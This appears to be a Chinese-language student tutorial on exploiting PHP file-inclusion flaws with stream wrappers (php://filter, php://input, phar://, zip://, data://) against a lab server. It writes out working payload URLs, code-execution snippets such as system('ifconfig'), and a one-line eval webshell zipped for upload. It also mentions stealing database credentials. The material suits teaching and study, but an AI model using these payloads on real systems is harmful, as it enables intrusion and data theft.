[TOC]



# ==PHP伪协议利用==

## 一、伪协议介绍

PHP支持以下几种协议：

```php
file://   #访问本地文件系统
http://   #访问HTTP(s)网址
ftp://    #访问FTP(s) URLs
php://    #访问各个输入/输出流（I/O streams）
zlib://   #压缩流
data://   #数据（RFC 2397）
glob://   #查找匹配的文件路径模式
phar://   #PHP归档
ssh2://   #Secure Shell 2
rar://    #RAR
ogg://    #音频流
expect:// #处理交互式的流
```

PHP:// 是一种伪协议，主要是开启了一个输入输出流，理解为文件数据传输的一个通道。php中的伪协议常使用的有如下几个 : php://input    php://filter     phar://



## 二、php://filter

当我们直接包含common.php文件是时候，`http://192.168.112.188/security/fileinc.php?filename=common.php`

虽然代码已经被调用，但是因为其是 php 文档，被Web容器解析，导致页面看不到源码内容，因为包含了该文件之后就相当于把该文件中的代码拷贝到源文件中当作后端代码执行了，从前端的源代码根本看不到这些包含的内容

这时候使用 php:// 将我们要读取的文件放在数据流中，然后我们通过伪协议的方式读出来，把被包含的文件换成这样写

**`php://filter/read/convert.base64-encode/resource=common.php`** 

这段命令的意思就是打开数据流，把common.php的内容用base64编码的方式读出来

我们执行后，在页面上就能看到一串base64的编码，通过工具解码后就能看到明文源码

如果正常包含 common.php 我们在前端页面是根本看不到的

![image-20240731143043585](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731143043585.png)

但如果使用这个方式就可以看到对被包含文件通过base64编码之后的内容

![image-20240731143011884](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731143011884.png)

对这些base64编码解码之后我们可以看到common.php的代码，这代码里面还有很多有用的信息，说不定就有数据库的连接密码，再配合之前上传的木马，利用冰蝎等，我们不就可以成功进入数据库了吗

![image-20240731143244421](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731143244421.png)

## 三、php://input

此方法需要条件，即开启 allow url include=On。实际上这相当于一个远程包含的利用。**基于post请求**

php:// 打开文件流后，我们直接在流里面写入我们的恶意代码，此时包含既可执行代码。**相当于我们的post请求中的内容就是我们要包含的文件中的内容** 

`http://192.168.112.188/security/fileinc.php?filename=php://input`

然后在POST请求中输入恶意代码，执行包含该代码，即可实现恶意代码的执行，比如:

```php
<?php phpinfo(); ?>
<?php system('ifconfig'); ?>
```

提交post正文（即恶意代码）之前

![image-20240731144101991](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731144101991.png)

提交post正文（即恶意代码）之后

![image-20240731144212437](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731144212437.png)

![image-20240731144724813](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731144724813.png)

## 四、phar://

**主要是用于在php中对压缩文件格式的读取。**这种方式通常是用来配合文件上传漏洞使用，或者进行进阶的phar反序列化攻击

用法就是把一句话木马压缩成zip格式，shell.txt ->shell.zip，然后再上传到服务器，后续通过前端页面上传也没有问题，通常服务器不会限制上传zip文件 再访问 : `http://192.168.230.147/security/fileinc.php?filename=phar://temp/remotefileinc.zip/remotefileinc.txt&a=phpinfo();`

> 要给目标服务器写入一个文件，要么直接想办法上传文件到目标服务器，要么进到命令行中去向攻击服务器请求下载。

- 先构造一个zip压缩文件，然后上传到目标服务器对应目录下

![image-20240731145352826](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731145352826.png)

remotefileinc.txt中的代码是 `<?php @eval($_GET["a"]);?>`

![image-20240731145537177](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731145537177.png)

- 访问`http://192.168.230.147/security/fileinc.php?filename=phar://temp/remotefileinc.zip/remotefileinc.txt&a=phpinfo();`

  ![image-20240731150354202](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731150354202.png)

  即可利用 phar:// 伪协议来访问zip文件中的恶意代码，该传参依旧传参就好了，甚至我们还可以把恶意代码放在文件夹中压缩成zip文件并上传，形成多级目录

## 五、zip://

也是对压缩文件进行读取操作，原理与用法跟phar几乎一样。区别是：

1、zip只能包含单级目录，即不能 /shel.zip%23folder%23shell.txt，而phar支持多级。

2、在压缩文件内的目录符号，要改成#，且在浏览器中请求的话，还要进行url编码%23

http://192.168.112.188/security/fileinc.php?filename=zip:///opt/lampp/htdocs/security/temp/shell.zip%23shell.txt

![image-20240731150920785](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731150920785.png)

![image-20240731151256811](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731151256811.png)

![image-20240731150925243](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731150925243.png)

## 六、data://

data:// 本身是数据流封装器，其原理和用法跟 php://input 类似，但是是发送**GET请求**参数。

data://text/plain,<?php phpinfo();?>

> data://text/plain 表示是普通文本

![image-20240731151635371](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731151635371.png)

data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==(这里使用base64编码的话，要减去php代码中的结束符号 ?> ，否则会报错)

![image-20240731151749366](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731151749366.png)

![image-20240731151701117](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731151701117.png)

如果添加上php代码的结束符 ?> 会怎样

 `<?php phpinfo(); ?>`  base64编码为`PD9waHAgcGhwaW5mbygpOyA/Pg==`

![image-20240731151839742](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731151839742.png)

![image-20240731151942730](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731151942730.png)

竟然没报错，跟老师讲的不一样欸

我知道了，老师用的是`<?php phpinfo();?>` base64编码为 `PD9waHAgcGhwaW5mbygpOz8+` 这样确实是错的

![image-20240731152219793](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240731152219793.png)

可以见的，?> 结束符之前的那个空格是异常的重要，我不过是比老师多了个空格而已，但我的结果是正确的，老师的结果就是错误的，这个情况就 data:// 存在，php://input 就没有影响
